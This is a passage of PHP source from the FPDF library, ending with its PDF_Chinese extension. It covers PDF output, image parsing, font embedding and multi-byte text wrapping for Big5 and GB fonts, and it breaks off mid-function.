	//Set x and y positions
	$this->SetY($y);
	$this->SetX($x);
}

function Output($name='', $dest='')
{
	//Output PDF to some destination
	if($this->state<3)
		$this->Close();
	$dest=strtoupper($dest);
	if($dest=='')
	{
		if($name=='')
		{
			$name='doc.pdf';
			$dest='I';
		}
		else
			$dest='F';
	}
	switch($dest)
	{
		case 'I':
			//Send to standard output
			if(ob_get_length())
				$this->Error('Some data has already been output, can\'t send PDF file');
			if(php_sapi_name()!='cli')
			{
				//We send to a browser
				header('Content-Type: application/pdf');
				if(headers_sent())
					$this->Error('Some data has already been output, can\'t send PDF file');
				header('Content-Length: '.strlen($this->buffer));
				header('Content-Disposition: inline; filename="'.$name.'"');
				header('Cache-Control: private, max-age=0, must-revalidate');
				header('Pragma: public');
				ini_set('zlib.output_compression','0');
			}
			echo $this->buffer;
			break;
		case 'D':
			//Download file
			if(ob_get_length())
				$this->Error('Some data has already been output, can\'t send PDF file');
			header('Content-Type: application/x-download');
			if(headers_sent())
				$this->Error('Some data has already been output, can\'t send PDF file');
			header('Content-Length: '.strlen($this->buffer));
			header('Content-Disposition: attachment; filename="'.$name.'"');
			header('Cache-Control: private, max-age=0, must-revalidate');
			header('Pragma: public');
			ini_set('zlib.output_compression','0');
			echo $this->buffer;
			break;
		case 'F':
			//Save to local file
			$f=fopen($name,'wb');
			if(!$f)
				$this->Error('Unable to create output file: '.$name);
			fwrite($f,$this->buffer,strlen($this->buffer));
			fclose($f);
			break;
		case 'S':
			//Return as a string
			return $this->buffer;
		default:
			$this->Error('Incorrect output destination: '.$dest);
	}
	return '';
}

/*******************************************************************************
*                                                                              *
*                              Protected methods                               *
*                                                                              *
*******************************************************************************/
function _dochecks()
{
	//Check availability of %F
	if(sprintf('%.1F',1.0)!='1.0')
		$this->Error('This version of PHP is not supported');
	//Check mbstring overloading
	if(ini_get('mbstring.func_overload') & 2)
		$this->Error('mbstring overloading must be disabled');
	//Disable runtime magic quotes
	if(get_magic_quotes_runtime())
		@set_magic_quotes_runtime(0);
}

function _getpageformat($format)
{
	$format=strtolower($format);
	if(!isset($this->PageFormats[$format]))
		$this->Error('Unknown page format: '.$format);
	$a=$this->PageFormats[$format];
	return array($a[0]/$this->k, $a[1]/$this->k);
}

function _getfontpath()
{
	if(!defined('FPDF_FONTPATH') && is_dir(dirname(__FILE__).'/font'))
		define('FPDF_FONTPATH',dirname(__FILE__).'/font/');
	return defined('FPDF_FONTPATH') ? FPDF_FONTPATH : '';
}

function _beginpage($orientation, $format)
{
	$this->page++;
	$this->pages[$this->page]='';
	$this->state=2;
	$this->x=$this->lMargin;
	$this->y=$this->tMargin;
	$this->FontFamily='';
	//Check page size
	if($orientation=='')
		$orientation=$this->DefOrientation;
	else
		$orientation=strtoupper($orientation[0]);
	if($format=='')
		$format=$this->DefPageFormat;
	else
	{
		if(is_string($format))
			$format=$this->_getpageformat($format);
	}
	if($orientation!=$this->CurOrientation || $format[0]!=$this->CurPageFormat[0] || $format[1]!=$this->CurPageFormat[1])
	{
		//New size
		if($orientation=='P')
		{
			$this->w=$format[0];
			$this->h=$format[1];
		}
		else
		{
			$this->w=$format[1];
			$this->h=$format[0];
		}
		$this->wPt=$this->w*$this->k;
		$this->hPt=$this->h*$this->k;
		$this->PageBreakTrigger=$this->h-$this->bMargin;
		$this->CurOrientation=$orientation;
		$this->CurPageFormat=$format;
	}
	if($orientation!=$this->DefOrientation || $format[0]!=$this->DefPageFormat[0] || $format[1]!=$this->DefPageFormat[1])
		$this->PageSizes[$this->page]=array($this->wPt, $this->hPt);
}

function _endpage()
{
	$this->state=1;
}

function _escape($s)
{
	//Escape special characters in strings
	$s=str_replace('\\','\\\\',$s);
	$s=str_replace('(','\\(',$s);
	$s=str_replace(')','\\)',$s);
	$s=str_replace("\r",'\\r',$s);
	return $s;
}

function _textstring($s)
{
	//Format a text string
	return '('.$this->_escape($s).')';
}

function _UTF8toUTF16($s)
{
	//Convert UTF-8 to UTF-16BE with BOM
	$res="\xFE\xFF";
	$nb=strlen($s);
	$i=0;
	while($i<$nb)
	{
		$c1=ord($s[$i++]);
		if($c1>=224)
		{
			//3-byte character
			$c2=ord($s[$i++]);
			$c3=ord($s[$i++]);
			$res.=chr((($c1 & 0x0F)<<4) + (($c2 & 0x3C)>>2));
			$res.=chr((($c2 & 0x03)<<6) + ($c3 & 0x3F));
		}
		elseif($c1>=192)
		{
			//2-byte character
			$c2=ord($s[$i++]);
			$res.=chr(($c1 & 0x1C)>>2);
			$res.=chr((($c1 & 0x03)<<6) + ($c2 & 0x3F));
		}
		else
		{
			//Single-byte character
			$res.="\0".chr($c1);
		}
	}
	return $res;
}

function _dounderline($x, $y, $txt)
{
	//Underline text
	$up=$this->CurrentFont['up'];
	$ut=$this->CurrentFont['ut'];
	$w=$this->GetStringWidth($txt)+$this->ws*substr_count($txt,' ');
	return sprintf('%.2F %.2F %.2F %.2F re f',$x*$this->k,($this->h-($y-$up/1000*$this->FontSize))*$this->k,$w*$this->k,-$ut/1000*$this->FontSizePt);
}

function _parsejpg($file)
{
	//Extract info from a JPEG file
	$a=GetImageSize($file);
	if(!$a)
		$this->Error('Missing or incorrect image file: '.$file);
	if($a[2]!=2)
		$this->Error('Not a JPEG file: '.$file);
	if(!isset($a['channels']) || $a['channels']==3)
		$colspace='DeviceRGB';
	elseif($a['channels']==4)
		$colspace='DeviceCMYK';
	else
		$colspace='DeviceGray';
	$bpc=isset($a['bits']) ? $a['bits'] : 8;
	//Read whole file
	$f=fopen($file,'rb');
	$data='';
	while(!feof($f))
		$data.=fread($f,8192);
	fclose($f);
	return array('w'=>$a[0], 'h'=>$a[1], 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'DCTDecode', 'data'=>$data);
}

function _parsepng($file)
{
	//Extract info from a PNG file
	$f=fopen($file,'rb');
	if(!$f)
		$this->Error('Can\'t open image file: '.$file);
	//Check signature
	if($this->_readstream($f,8)!=chr(137).'PNG'.chr(13).chr(10).chr(26).chr(10))
		$this->Error('Not a PNG file: '.$file);
	//Read header chunk
	$this->_readstream($f,4);
	if($this->_readstream($f,4)!='IHDR')
		$this->Error('Incorrect PNG file: '.$file);
	$w=$this->_readint($f);
	$h=$this->_readint($f);
	$bpc=ord($this->_readstream($f,1));
	if($bpc>8)
		$this->Error('16-bit depth not supported: '.$file);
	$ct=ord($this->_readstream($f,1));
	if($ct==0)
		$colspace='DeviceGray';
	elseif($ct==2)
		$colspace='DeviceRGB';
	elseif($ct==3)
		$colspace='Indexed';
	else
		$this->Error('Alpha channel not supported: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown compression method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown filter method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Interlacing not supported: '.$file);
	$this->_readstream($f,4);
	$parms='/DecodeParms <</Predictor 15 /Colors '.($ct==2 ? 3 : 1).' /BitsPerComponent '.$bpc.' /Columns '.$w.'>>';
	//Scan chunks looking for palette, transparency and image data
	$pal='';
	$trns='';
	$data='';
	do
	{
		$n=$this->_readint($f);
		$type=$this->_readstream($f,4);
		if($type=='PLTE')
		{
			//Read palette
			$pal=$this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='tRNS')
		{
			//Read transparency info
			$t=$this->_readstream($f,$n);
			if($ct==0)
				$trns=array(ord(substr($t,1,1)));
			elseif($ct==2)
				$trns=array(ord(substr($t,1,1)), ord(substr($t,3,1)), ord(substr($t,5,1)));
			else
			{
				$pos=strpos($t,chr(0));
				if($pos!==false)
					$trns=array($pos);
			}
			$this->_readstream($f,4);
		}
		elseif($type=='IDAT')
		{
			//Read image data block
			$data.=$this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='IEND')
			break;
		else
			$this->_readstream($f,$n+4);
	}
	while($n);
	if($colspace=='Indexed' && empty($pal))
		$this->Error('Missing palette in '.$file);
	fclose($f);
	return array('w'=>$w, 'h'=>$h, 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'FlateDecode', 'parms'=>$parms, 'pal'=>$pal, 'trns'=>$trns, 'data'=>$data);
}

function _readstream($f, $n)
{
	//Read n bytes from stream
	$res='';
	while($n>0 && !feof($f))
	{
		$s=fread($f,$n);
		if($s===false)
			$this->Error('Error while reading stream');
		$n-=strlen($s);
		$res.=$s;
	}
	if($n>0)
		$this->Error('Unexpected end of stream');
	return $res;
}

function _readint($f)
{
	//Read a 4-byte integer from stream
	$a=unpack('Ni',$this->_readstream($f,4));
	return $a['i'];
}

function _parsegif($file)
{
	//Extract info from a GIF file (via PNG conversion)
	if(!function_exists('imagepng'))
		$this->Error('GD extension is required for GIF support');
	if(!function_exists('imagecreatefromgif'))
		$this->Error('GD has no GIF read support');
	$im=imagecreatefromgif($file);
	if(!$im)
		$this->Error('Missing or incorrect image file: '.$file);
	imageinterlace($im,0);
	$tmp=tempnam('.','gif');
	if(!$tmp)
		$this->Error('Unable to create a temporary file');
	if(!imagepng($im,$tmp))
		$this->Error('Error while saving to temporary file');
	imagedestroy($im);
	$info=$this->_parsepng($tmp);
	unlink($tmp);
	return $info;
}

function _newobj()
{
	//Begin a new object
	$this->n++;
	$this->offsets[$this->n]=strlen($this->buffer);
	$this->_out($this->n.' 0 obj');
}

function _putstream($s)
{
	$this->_out('stream');
	$this->_out($s);
	$this->_out('endstream');
}

function _out($s)
{
	//Add a line to the document
	if($this->state==2)
		$this->pages[$this->page].=$s."\n";
	else
		$this->buffer.=$s."\n";
}

function _putpages()
{
	$nb=$this->page;
	if(!empty($this->AliasNbPages))
	{
		//Replace number of pages
		for($n=1;$n<=$nb;$n++)
			$this->pages[$n]=str_replace($this->AliasNbPages,$nb,$this->pages[$n]);
	}
	if($this->DefOrientation=='P')
	{
		$wPt=$this->DefPageFormat[0]*$this->k;
		$hPt=$this->DefPageFormat[1]*$this->k;
	}
	else
	{
		$wPt=$this->DefPageFormat[1]*$this->k;
		$hPt=$this->DefPageFormat[0]*$this->k;
	}
	$filter=($this->compress) ? '/Filter /FlateDecode ' : '';
	for($n=1;$n<=$nb;$n++)
	{
		//Page
		$this->_newobj();
		$this->_out('<</Type /Page');
		$this->_out('/Parent 1 0 R');
		if(isset($this->PageSizes[$n]))
			$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$this->PageSizes[$n][0],$this->PageSizes[$n][1]));
		$this->_out('/Resources 2 0 R');
		if(isset($this->PageLinks[$n]))
		{
			//Links
			$annots='/Annots [';
			foreach($this->PageLinks[$n] as $pl)
			{
				$rect=sprintf('%.2F %.2F %.2F %.2F',$pl[0],$pl[1],$pl[0]+$pl[2],$pl[1]-$pl[3]);
				$annots.='<</Type /Annot /Subtype /Link /Rect ['.$rect.'] /Border [0 0 0] ';
				if(is_string($pl[4]))
					$annots.='/A <</S /URI /URI '.$this->_textstring($pl[4]).'>>>>';
				else
				{
					$l=$this->links[$pl[4]];
					$h=isset($this->PageSizes[$l[0]]) ? $this->PageSizes[$l[0]][1] : $hPt;
					$annots.=sprintf('/Dest [%d 0 R /XYZ 0 %.2F null]>>',1+2*$l[0],$h-$l[1]*$this->k);
				}
			}
			$this->_out($annots.']');
		}
		$this->_out('/Contents '.($this->n+1).' 0 R>>');
		$this->_out('endobj');
		//Page content
		$p=($this->compress) ? gzcompress($this->pages[$n]) : $this->pages[$n];
		$this->_newobj();
		$this->_out('<<'.$filter.'/Length '.strlen($p).'>>');
		$this->_putstream($p);
		$this->_out('endobj');
	}
	//Pages root
	$this->offsets[1]=strlen($this->buffer);
	$this->_out('1 0 obj');
	$this->_out('<</Type /Pages');
	$kids='/Kids [';
	for($i=0;$i<$nb;$i++)
		$kids.=(3+2*$i).' 0 R ';
	$this->_out($kids.']');
	$this->_out('/Count '.$nb);
	$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$wPt,$hPt));
	$this->_out('>>');
	$this->_out('endobj');
}

function _putfonts()
{
	$nf=$this->n;
	foreach($this->diffs as $diff)
	{
		//Encodings
		$this->_newobj();
		$this->_out('<</Type /Encoding /BaseEncoding /WinAnsiEncoding /Differences ['.$diff.']>>');
		$this->_out('endobj');
	}
	foreach($this->FontFiles as $file=>$info)
	{
		//Font file embedding
		$this->_newobj();
		$this->FontFiles[$file]['n']=$this->n;
		$font='';
		$f=fopen($this->_getfontpath().$file,'rb',1);
		if(!$f)
			$this->Error('Font file not found');
		while(!feof($f))
			$font.=fread($f,8192);
		fclose($f);
		$compressed=(substr($file,-2)=='.z');
		if(!$compressed && isset($info['length2']))
		{
			$header=(ord($font[0])==128);
			if($header)
			{
				//Strip first binary header
				$font=substr($font,6);
			}
			if($header && ord($font[$info['length1']])==128)
			{
				//Strip second binary header
				$font=substr($font,0,$info['length1']).substr($font,$info['length1']+6);
			}
		}
		$this->_out('<</Length '.strlen($font));
		if($compressed)
			$this->_out('/Filter /FlateDecode');
		$this->_out('/Length1 '.$info['length1']);
		if(isset($info['length2']))
			$this->_out('/Length2 '.$info['length2'].' /Length3 0');
		$this->_out('>>');
		$this->_putstream($font);
		$this->_out('endobj');
	}
	foreach($this->fonts as $k=>$font)
	{
		//Font objects
		$this->fonts[$k]['n']=$this->n+1;
		$type=$font['type'];
		$name=$font['name'];
		if($type=='core')
		{
			//Standard font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /Type1');
			if($name!='Symbol' && $name!='ZapfDingbats')
				$this->_out('/Encoding /WinAnsiEncoding');
			$this->_out('>>');
			$this->_out('endobj');
		}
		elseif($type=='Type1' || $type=='TrueType')
		{
			//Additional Type1 or TrueType font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /'.$type);
			$this->_out('/FirstChar 32 /LastChar 255');
			$this->_out('/Widths '.($this->n+1).' 0 R');
			$this->_out('/FontDescriptor '.($this->n+2).' 0 R');
			if($font['enc'])
			{
				if(isset($font['diff']))
					$this->_out('/Encoding '.($nf+$font['diff']).' 0 R');
				else
					$this->_out('/Encoding /WinAnsiEncoding');
			}
			$this->_out('>>');
			$this->_out('endobj');
			//Widths
			$this->_newobj();
			$cw=&$font['cw'];
			$s='[';
			for($i=32;$i<=255;$i++)
				$s.=$cw[chr($i)].' ';
			$this->_out($s.']');
			$this->_out('endobj');
			//Descriptor
			$this->_newobj();
			$s='<</Type /FontDescriptor /FontName /'.$name;
			foreach($font['desc'] as $k=>$v)
				$s.=' /'.$k.' '.$v;
			$file=$font['file'];
			if($file)
				$s.=' /FontFile'.($type=='Type1' ? '' : '2').' '.$this->FontFiles[$file]['n'].' 0 R';
			$this->_out($s.'>>');
			$this->_out('endobj');
		}
		else
		{
			//Allow for additional types
			$mtd='_put'.strtolower($type);
			if(!method_exists($this,$mtd))
				$this->Error('Unsupported font type: '.$type);
			$this->$mtd($font);
		}
	}
}

function _putimages()
{
	$filter=($this->compress) ? '/Filter /FlateDecode ' : '';
	reset($this->images);
	while(list($file,$info)=each($this->images))
	{
		$this->_newobj();
		$this->images[$file]['n']=$this->n;
		$this->_out('<</Type /XObject');
		$this->_out('/Subtype /Image');
		$this->_out('/Width '.$info['w']);
		$this->_out('/Height '.$info['h']);
		if($info['cs']=='Indexed')
			$this->_out('/ColorSpace [/Indexed /DeviceRGB '.(strlen($info['pal'])/3-1).' '.($this->n+1).' 0 R]');
		else
		{
			$this->_out('/ColorSpace /'.$info['cs']);
			if($info['cs']=='DeviceCMYK')
				$this->_out('/Decode [1 0 1 0 1 0 1 0]');
		}
		$this->_out('/BitsPerComponent '.$info['bpc']);
		if(isset($info['f']))
			$this->_out('/Filter /'.$info['f']);
		if(isset($info['parms']))
			$this->_out($info['parms']);
		if(isset($info['trns']) && is_array($info['trns']))
		{
			$trns='';
			for($i=0;$i<count($info['trns']);$i++)
				$trns.=$info['trns'][$i].' '.$info['trns'][$i].' ';
			$this->_out('/Mask ['.$trns.']');
		}
		$this->_out('/Length '.strlen($info['data']).'>>');
		$this->_putstream($info['data']);
		unset($this->images[$file]['data']);
		$this->_out('endobj');
		//Palette
		if($info['cs']=='Indexed')
		{
			$this->_newobj();
			$pal=($this->compress) ? gzcompress($info['pal']) : $info['pal'];
			$this->_out('<<'.$filter.'/Length '.strlen($pal).'>>');
			$this->_putstream($pal);
			$this->_out('endobj');
		}
	}
}

function _putxobjectdict()
{
	foreach($this->images as $image)
		$this->_out('/I'.$image['i'].' '.$image['n'].' 0 R');
}

function _putresourcedict()
{
	$this->_out('/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]');
	$this->_out('/Font <<');
	foreach($this->fonts as $font)
		$this->_out('/F'.$font['i'].' '.$font['n'].' 0 R');
	$this->_out('>>');
	$this->_out('/XObject <<');
	$this->_putxobjectdict();
	$this->_out('>>');
}

function _putresources()
{
	$this->_putfonts();
	$this->_putimages();
	//Resource dictionary
	$this->offsets[2]=strlen($this->buffer);
	$this->_out('2 0 obj');
	$this->_out('<<');
	$this->_putresourcedict();
	$this->_out('>>');
	$this->_out('endobj');
}

function _putinfo()
{
	$this->_out('/Producer '.$this->_textstring('FPDF '.FPDF_VERSION));
	if(!empty($this->title))
		$this->_out('/Title '.$this->_textstring($this->title));
	if(!empty($this->subject))
		$this->_out('/Subject '.$this->_textstring($this->subject));
	if(!empty($this->author))
		$this->_out('/Author '.$this->_textstring($this->author));
	if(!empty($this->keywords))
		$this->_out('/Keywords '.$this->_textstring($this->keywords));
	if(!empty($this->creator))
		$this->_out('/Creator '.$this->_textstring($this->creator));
	$this->_out('/CreationDate '.$this->_textstring('D:'.@date('YmdHis')));
}

function _putcatalog()
{
	$this->_out('/Type /Catalog');
	$this->_out('/Pages 1 0 R');
	if($this->ZoomMode=='fullpage')
		$this->_out('/OpenAction [3 0 R /Fit]');
	elseif($this->ZoomMode=='fullwidth')
		$this->_out('/OpenAction [3 0 R /FitH null]');
	elseif($this->ZoomMode=='real')
		$this->_out('/OpenAction [3 0 R /XYZ null null 1]');
	elseif(!is_string($this->ZoomMode))
		$this->_out('/OpenAction [3 0 R /XYZ null null '.($this->ZoomMode/100).']');
	if($this->LayoutMode=='single')
		$this->_out('/PageLayout /SinglePage');
	elseif($this->LayoutMode=='continuous')
		$this->_out('/PageLayout /OneColumn');
	elseif($this->LayoutMode=='two')
		$this->_out('/PageLayout /TwoColumnLeft');
}

function _putheader()
{
	$this->_out('%PDF-'.$this->PDFVersion);
}

function _puttrailer()
{
	$this->_out('/Size '.($this->n+1));
	$this->_out('/Root '.$this->n.' 0 R');
	$this->_out('/Info '.($this->n-1).' 0 R');
}

function _enddoc()
{
	$this->_putheader();
	$this->_putpages();
	$this->_putresources();
	//Info
	$this->_newobj();
	$this->_out('<<');
	$this->_putinfo();
	$this->_out('>>');
	$this->_out('endobj');
	//Catalog
	$this->_newobj();
	$this->_out('<<');
	$this->_putcatalog();
	$this->_out('>>');
	$this->_out('endobj');
	//Cross-ref
	$o=strlen($this->buffer);
	$this->_out('xref');
	$this->_out('0 '.($this->n+1));
	$this->_out('0000000000 65535 f ');
	for($i=1;$i<=$this->n;$i++)
		$this->_out(sprintf('%010d 00000 n ',$this->offsets[$i]));
	//Trailer
	$this->_out('trailer');
	$this->_out('<<');
	$this->_puttrailer();
	$this->_out('>>');
	$this->_out('startxref');
	$this->_out($o);
	$this->_out('%%EOF');
	$this->state=3;
}
//End of class
}

//Handle special IE contype request
if(isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT']=='contype')
{
	header('Content-Type: application/pdf');
	exit;
}
?>
<?php 
//require('fpdf.php');

$Big5_widths = array(' '=>250,'!'=>250,'"'=>408,'#'=>668,'$'=>490,'%'=>875,'&'=>698,'\''=>250,
	'('=>240,')'=>240,'*'=>417,'+'=>667,','=>250,'-'=>313,'.'=>250,'/'=>520,'0'=>500,'1'=>500,
	'2'=>500,'3'=>500,'4'=>500,'5'=>500,'6'=>500,'7'=>500,'8'=>500,'9'=>500,':'=>250,';'=>250,
	'<'=>667,'='=>667,'>'=>667,'?'=>396,'@'=>921,'A'=>677,'B'=>615,'C'=>719,'D'=>760,'E'=>625,
	'F'=>552,'G'=>771,'H'=>802,'I'=>354,'J'=>354,'K'=>781,'L'=>604,'M'=>927,'N'=>750,'O'=>823,
	'P'=>563,'Q'=>823,'R'=>729,'S'=>542,'T'=>698,'U'=>771,'V'=>729,'W'=>948,'X'=>771,'Y'=>677,
	'Z'=>635,'['=>344,'\\'=>520,']'=>344,'^'=>469,'_'=>500,'`'=>250,'a'=>469,'b'=>521,'c'=>427,
	'd'=>521,'e'=>438,'f'=>271,'g'=>469,'h'=>531,'i'=>250,'j'=>250,'k'=>458,'l'=>240,'m'=>802,
	'n'=>531,'o'=>500,'p'=>521,'q'=>521,'r'=>365,'s'=>333,'t'=>292,'u'=>521,'v'=>458,'w'=>677,
	'x'=>479,'y'=>458,'z'=>427,'{'=>480,'|'=>496,'}'=>480,'~'=>667);

$GB_widths = array(' '=>207,'!'=>270,'"'=>342,'#'=>467,'$'=>462,'%'=>797,'&'=>710,'\''=>239,
	'('=>374,')'=>374,'*'=>423,'+'=>605,','=>238,'-'=>375,'.'=>238,'/'=>334,'0'=>462,'1'=>462,
	'2'=>462,'3'=>462,'4'=>462,'5'=>462,'6'=>462,'7'=>462,'8'=>462,'9'=>462,':'=>238,';'=>238,
	'<'=>605,'='=>605,'>'=>605,'?'=>344,'@'=>748,'A'=>684,'B'=>560,'C'=>695,'D'=>739,'E'=>563,
	'F'=>511,'G'=>729,'H'=>793,'I'=>318,'J'=>312,'K'=>666,'L'=>526,'M'=>896,'N'=>758,'O'=>772,
	'P'=>544,'Q'=>772,'R'=>628,'S'=>465,'T'=>607,'U'=>753,'V'=>711,'W'=>972,'X'=>647,'Y'=>620,
	'Z'=>607,'['=>374,'\\'=>333,']'=>374,'^'=>606,'_'=>500,'`'=>239,'a'=>417,'b'=>503,'c'=>427,
	'd'=>529,'e'=>415,'f'=>264,'g'=>444,'h'=>518,'i'=>241,'j'=>230,'k'=>495,'l'=>228,'m'=>793,
	'n'=>527,'o'=>524,'p'=>524,'q'=>504,'r'=>338,'s'=>336,'t'=>277,'u'=>517,'v'=>450,'w'=>652,
	'x'=>466,'y'=>452,'z'=>407,'{'=>370,'|'=>258,'}'=>370,'~'=>605);

class PDF_Chinese extends FPDF
{
function AddCIDFont($family, $style, $name, $cw, $CMap, $registry)
{
	$fontkey = strtolower($family).strtoupper($style);
	if(isset($this->fonts[$fontkey]))
		$this->Error("Font already added: $family $style");
	$i = count($this->fonts)+1;
	$name = str_replace(' ','',$name);
	$this->fonts[$fontkey] = array('i'=>$i, 'type'=>'Type0', 'name'=>$name, 'up'=>-130, 'ut'=>40, 'cw'=>$cw, 'CMap'=>$CMap, 'registry'=>$registry);
}

function AddCIDFonts($family, $name, $cw, $CMap, $registry)
{
	$this->AddCIDFont($family,'',$name,$cw,$CMap,$registry);
	$this->AddCIDFont($family,'B',$name.',Bold',$cw,$CMap,$registry);
	$this->AddCIDFont($family,'I',$name.',Italic',$cw,$CMap,$registry);
	$this->AddCIDFont($family,'BI',$name.',BoldItalic',$cw,$CMap,$registry);
}

function AddBig5Font($family='Big5', $name='MSungStd-Light-Acro')
{
	// Add Big5 font with proportional Latin
	$cw = $GLOBALS['Big5_widths'];
	$CMap = 'ETenms-B5-H';
	$registry = array('ordering'=>'CNS1', 'supplement'=>0);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddBig5hwFont($family='Big5-hw', $name='MSungStd-Light-Acro')
{
	// Add Big5 font with half-witdh Latin
	for($i=32;$i<=126;$i++)
		$cw[chr($i)] = 500;
	$CMap = 'ETen-B5-H';
	$registry = array('ordering'=>'CNS1', 'supplement'=>0);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddGBFont($family='GB', $name='STSongStd-Light-Acro')
{
	// Add GB font with proportional Latin
	$cw = $GLOBALS['GB_widths'];
	$CMap = 'GBKp-EUC-H';
	$registry = array('ordering'=>'GB1', 'supplement'=>2);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function AddGBhwFont($family='GB-hw', $name='STSongStd-Light-Acro')
{
	// Add GB font with half-width Latin
	for($i=32;$i<=126;$i++)
		$cw[chr($i)] = 500;
	$CMap = 'GBK-EUC-H';
	$registry = array('ordering'=>'GB1', 'supplement'=>2);
	$this->AddCIDFonts($family,$name,$cw,$CMap,$registry);
}

function GetStringWidth($s)
{
	if($this->CurrentFont['type']=='Type0')
		return $this->GetMBStringWidth($s);
	else
		return parent::GetStringWidth($s);
}

function GetMBStringWidth($s)
{
	// Multi-byte version of GetStringWidth()
	$l = 0;
	$cw = &$this->CurrentFont['cw'];
	$nb = strlen($s);
	$i = 0;
	while($i<$nb)
	{
		$c = $s[$i];
		if(ord($c)<128)
		{
			$l += $cw[$c];
			$i++;
		}
		else
		{
			$l += 1000;
			$i += 2;
		}
	}
	return $l*$this->FontSize/1000;
}

function MultiCell($w, $h, $txt, $border=0, $align='L', $fill=0)
{
	if($this->CurrentFont['type']=='Type0')
		$this->MBMultiCell($w,$h,$txt,$border,$align,$fill);
	else
		parent::MultiCell($w,$h,$txt,$border,$align,$fill);
}

function MBMultiCell($w, $h, $txt, $border=0, $align='L', $fill=0)
{
	// Multi-byte version of MultiCell()
	$cw = &$this->CurrentFont['cw'];
	if($w==0)
		$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	if($nb>0 && $s[$nb-1]=="\n")
		$nb--;
	$b = 0;
	if($border)
	{
		if($border==1)
		{
			$border = 'LTRB';
			$b = 'LRT';
			$b2 = 'LR';
		}
		else
		{
			$b2 = '';
			if(is_int(strpos($border,'L')))
				$b2 .= 'L';
			if(is_int(strpos($border,'R')))
				$b2 .= 'R';
			$b = is_int(strpos($border,'T')) ? $b2.'T' : $b2;
		}
	}
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		// Check if ASCII or MB
		$ascii = (ord($c)<128);
		if($c=="\n")
		{
			// Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
			continue;
		}
		if(!$ascii)
		{
			$sep = $i;
			$ls = $l;
		}
		elseif($c==' ')
		{
			$sep = $i;
			$ls = $l;
		}
		$l += $ascii ? $cw[$c] : 1000;
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1 || $i==$j)
			{
				if($i==$j)
					$i += $ascii ? 1 : 2;
				$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),$b,2,$align,$fill);
				$i = ($s[$sep]==' ') ? $sep+1 : $sep;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			$nl++;
			if($border && $nl==2)
				$b = $b2;
		}
		else
			$i += $ascii ? 1 : 2;
	}
	// Last chunk
	if($border && is_int(strpos($border,'B')))
		$b .= 'B';
	$this->Cell($w,$h,substr($s,$j,$i-$j),$b,2,$align,$fill);
	$this->x = $this->lMargin;
}

function Write($h, $txt, $link='')
{
	if($this->CurrentFont['type']=='Type0')
		$this->MBWrite($h,$txt,$link);
	else
		parent::Write($h,$txt,$link);
}

function MBWrite($h, $txt, $link)
{
	// Multi-byte version of Write()
	$cw = &$this->CurrentFont['cw'];
	$w = $this->w-$this->rMargin-$this->x;
	$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
	$s = str_replace("\r",'',$txt);
	$nb = strlen($s);
	$sep = -1;
	$i = 0;
	$j = 0;
	$l = 0;
	$nl = 1;
	while($i<$nb)
	{
		// Get next character
		$c = $s[$i];
		// Check if ASCII or MB
		$ascii = (ord($c)<128);
		if($c=="\n")
		{
			// Explicit line break
			$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			$i++;
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
			continue;
		}
		if(!$ascii || $c==' ')
			$sep = $i;
		$l += $ascii ? $cw[$c] : 1000;
		if($l>$wmax)
		{
			// Automatic line break
			if($sep==-1 || $i==$j)
			{
				if($this->x>$this->lMargin)
				{
					// Move to next line
					$this->x = $this->lMargin;
					$this->y += $h;
					$w = $this->w-$this->rMargin-$this->x;
					$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
					$i++;
					$nl++;
					continue;
				}
				if($i==$j)
					$i += $ascii ? 1 : 2;
				$this->Cell($w,$h,substr($s,$j,$i-$j),0,2,'',0,$link);
			}
			else
			{
				$this->Cell($w,$h,substr($s,$j,$sep-$j),0,2,'',0,$link);
				$i = ($s[$sep]==' ') ? $sep+1 : $sep;
			}
			$sep = -1;
			$j = $i;
			$l = 0;
			if($nl==1)
			{
				$this->x = $this->lMargin;
				$w = $this->w-$this->rMargin-$this->x;
				$wmax = ($w-2*$this->cMargin)*1000/$this->FontSize;
			}
			$nl++;
		}
		else
			$i += $ascii ? 1 : 2;
	}
	// Last chunk
	if($i!=$j)
		$this->Cell($l/1000*$this->FontSize,$h,substr($s,$j,$i-$j),0,0,'',0,$link);
}

function _putType0($font)
{
	// Type0
	$this->_newobj();
	$this->_out('<</Type /Font');
	$this->_out('/Subtype /Type0');
